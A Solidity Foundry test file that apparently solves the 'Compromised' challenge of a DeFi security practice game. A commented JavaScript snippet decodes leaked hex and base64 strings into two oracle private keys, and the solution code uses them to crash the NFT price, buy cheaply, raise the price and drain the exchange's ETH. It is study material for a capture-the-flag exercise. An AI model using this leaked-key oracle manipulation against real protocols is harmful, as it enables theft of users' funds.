// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";
import "../../src/DamnValuableNFT.sol";
import "../../src/07_compromised/TrustfulOracle.sol";
import "../../src/07_compromised/TrustfulOracleInitializer.sol";
import "../../src/07_compromised/Exchange.sol";

contract Compromised is Test {
    address deployer;
    address player;
    address[] sources = [
        address(0xA73209FB1a42495120166736362A1DfA9F95A105),
        address(0xe92401A4d3af5E446d93D11EEc806b1462b39D15),
        address(0x81A5D6E50C214044bE44cA0CB057fe119097850c)
    ];

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    TrustfulOracle internal oracle;
    Exchange internal exchange;
    DamnValuableNFT internal nftToken;

    function setUp() public {
        deployer = address(this);
        player = address(0x2);

        vm.deal(deployer, 10_000 ether);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        string[] memory symbols = new string[](3);
        uint256[] memory initialPrices = new uint256[](3);
        for (uint256 i = 0; i < 3; i++) {
            symbols[i] = "DVNFT";
            initialPrices[i] = INITIAL_NFT_PRICE;
        }

        // Deploy the oracle and setup the trusted sources with initial prices
        TrustfulOracleInitializer oracleInitializer = new TrustfulOracleInitializer(sources, symbols, initialPrices);
        oracle = TrustfulOracle(address(oracleInitializer.oracle()));

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{ value: EXCHANGE_INITIAL_ETH_BALANCE }(address(oracle));
        nftToken = DamnValuableNFT(exchange.token());
        assertEq(nftToken.owner(), address(0)); // ownership renounced
        assertEq(nftToken.rolesOf(address(exchange)), nftToken.MINTER_ROLE());
    }

    function _execution() private {
        /**
         * CODE YOUR SOLUTION HERE
         */

        /*
        Javascript Hex => Assci => Base64 decode

        function hex2a(hexx) {
            var hex = hexx.toString();
            var str = '';
            for (var i = 0; i < hex.length; i += 2)
                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
            return str;
        }

        var
        aHex="4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535";
        var
        bHex="4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134";

        var aAsc = hex2a(aHex);
        var bAsc = hex2a(bHex);

        var aDecode = atob(aAsc);
        var bDecode = atob(bAsc);

        console.log("aDecode: ", aDecode);
        console.log("bDecode: ", bDecode);

        aDecode:  0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        bDecode:  0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48

        */

        uint256 privateKey1 = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
        uint256 privateKey2 = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;

        address oracelAdmin1 = vm.addr(privateKey1);
        address oracelAdmin2 = vm.addr(privateKey2);

        vm.prank(oracelAdmin1);
        oracle.postPrice("DVNFT", 1);
        vm.prank(oracelAdmin2);
        oracle.postPrice("DVNFT", 1);

        vm.prank(player);
        uint256 tokenId = exchange.buyOne{ value: 1 }();

        vm.prank(oracelAdmin1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE + 1);
        vm.prank(oracelAdmin2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE + 1);

        vm.prank(player);
        nftToken.approve(address(exchange), tokenId);
        vm.prank(player);
        exchange.sellOne(tokenId);

        vm.prank(oracelAdmin1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(oracelAdmin2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    }

    function testCompromised() public {
        _execution();

        // SUCCESS CONDITIONS

        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);

        // Player's ETH balance must have significantly increased
        assertGt(player.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nftToken.balanceOf(player), 0);

        // NFT price shouldn't have changed
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
